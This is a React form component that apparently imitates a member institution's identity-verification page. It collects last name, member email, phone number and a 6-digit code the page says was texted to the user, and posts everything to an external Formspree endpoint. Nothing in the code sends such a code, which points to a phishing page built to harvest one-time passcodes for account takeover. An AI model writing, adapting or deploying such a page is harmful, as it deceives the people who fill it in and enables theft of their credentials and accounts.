import { useForm } from '@formspree/react';

import {InputField} from '../InputField/InputField'

const styles = {
    efcYellow: '#ED8B00',
    fontMedium: "1.5rem"
}
export default function Register (){
    const [state, handleSubmit] = useForm("mgeqdqko");
    if (state.succeeded) {
        return <p style={{color: styles.efcYellow, fontSize: styles.fontMedium, padding: '6rem 0'}}>Thanks we will get back to you! Close the page now.</p>;
    }
    return (
        <div>
            <p style={{color: styles.efcYellow, fontSize: styles.fontMedium}}>
                Provide the following information to verify your identity
            </p>
            <form 
                onSubmit={handleSubmit}
            >
                <InputField name={'Last Name'} />
                <InputField name={'Member Email Address'} />
                <InputField name={'Phone Number'} />
                <p style={{color: styles.efcYellow, fontSize: styles.fontMedium}}>For your security, A 6 digit code have been sent to your phone number. Please wait for a minute to receive it</p>
                <InputField name={'Verification Code'} />
                <button  type="submit" disabled={state.submitting}>Submit</button>
            </form>
        </div>
    )
}